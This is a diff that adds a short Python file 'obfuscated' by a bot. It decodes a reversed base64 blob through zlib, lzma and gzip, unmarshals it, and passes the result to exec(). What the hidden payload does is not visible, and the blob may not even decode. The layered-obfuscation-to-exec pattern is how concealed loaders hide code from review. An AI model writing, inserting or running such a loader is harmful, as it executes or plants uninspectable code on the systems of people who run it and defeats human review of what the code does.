@@ -1,0 +1,2 @@
+# Obfuscation by @rendyobfuscatorbot
+_=lambda __:__import__('marshal').loads(__import__('gzip').decompress(__import__('lzma').decompress(__import__('zlib').decompress(__import__('base64').b64decode(__[::-1])))));exec(_('Vyy88AQURyiEBlxaf2W+vURJDcESGbQLOfYarDstWCCEMobn7da5hFIgEDM1lUL6+Vtn6/85z9IMgOaypDnEYkR5/cNnrZ4TnM7jpAsY7bUd4AN0Ih0Sftm/ZKjoawMG5sL5ckRGLea/SYoBGEjRFZgJ3Yh2sLPwAXcEV41a7zJe'))
